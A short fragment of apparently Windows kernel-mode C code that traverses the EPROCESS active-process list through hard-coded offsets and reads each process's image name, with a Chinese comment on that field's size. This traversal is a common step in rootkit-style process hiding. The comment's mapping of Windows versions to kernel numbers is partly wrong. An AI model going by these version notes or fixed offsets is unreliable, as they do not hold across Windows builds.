BYTE*  getNextEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  nextEPROCESSpointer = NULL;
	BYTE*  flink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	flink = (BYTE*)(ListEntry.Flink);
	nextEPROCESSpointer = (flink - EPROCESS_OFFSET_LINKS);
	return nextEPROCESSpointer;
}



BYTE*  getPreviousEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  blink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	blink = (BYTE*)(ListEntry.Blink);
	prevEPROCESSpointer = (blink - EPROCESS_OFFSET_LINKS);
	return prevEPROCESSpointer;
}


unsigned char*  get_proc_name(BYTE*  currentEPROCESSpointer){
	unsigned char* proc_name;

	// _EPROCESS.ImageFileName 字段就是一个 UCHAR（亦即 unsigned char）型数组，
	//在 NT5.2 版内核（用于windows xp ,2003）中长度 16 字节，在 NT6.2 版内核（用于windows 7, 2008）中长度 15 字节
	proc_name = (unsigned char*)(currentEPROCESSpointer + EPROCESS_OFFSET_NAME);
	return (proc_name);
}





*/